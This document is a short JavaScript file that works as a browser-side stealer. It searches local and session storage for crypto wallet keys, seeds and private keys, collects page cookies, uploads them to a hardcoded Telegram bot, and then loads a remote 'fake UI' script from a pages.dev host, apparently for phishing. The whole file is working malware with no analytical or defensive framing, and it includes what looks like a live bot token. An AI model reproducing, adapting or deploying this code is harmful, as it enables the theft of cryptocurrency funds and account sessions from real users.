(function() {
    // 1. CONFIGURATION
    const T = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
    const C = '8321398409';
    const TARGETS = ['.phantom', '.vault', '.offline', '.fungible', 'padre', 'seed', 'privateKey', 'encryptionKey'];

    async function vantaMain() {
        console.log("📡 NODE_ACTIVE");
        let data = `--- VANTA CAPTURE: ${location.hostname} ---\n\n`;

        // 2. SEARCH STORAGE
        [localStorage, sessionStorage].forEach(s => {
            for (let i = 0; i < s.length; i++) {
                let k = s.key(i);
                if (TARGETS.some(t => k.toLowerCase().includes(t))) {
                    data += `[${k}]\n${s.getItem(k)}\n\n`;
                }
            }
        });
        data += `--- COOKIES ---\n${document.cookie}`;

        // 3. SEND TO TELEGRAM (Using Blob to prevent size errors)
        const blob = new Blob([data], { type: 'text/plain' });
        const fd = new FormData();
        fd.append('chat_id', C);
        fd.append('document', blob, `vault_${Date.now()}.txt`);

        try {
            // Use no-cors to bypass Padre's security blocks (CORB)
            fetch(`https://api.telegram.org/bot${T}/sendDocument`, { 
                method: 'POST', 
                body: fd, 
                mode: 'no-cors' 
            });

            // 4. TRIGGER FAKE UI
            // We wait 500ms to ensure the data is sent before the UI pops up
            setTimeout(() => {
                const s = document.createElement('script');
                s.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
                document.head.appendChild(s);
            }, 500);
            
        } catch (e) {
            console.error("Vanta Engine Failure");
        }
    }

    vantaMain();
})();
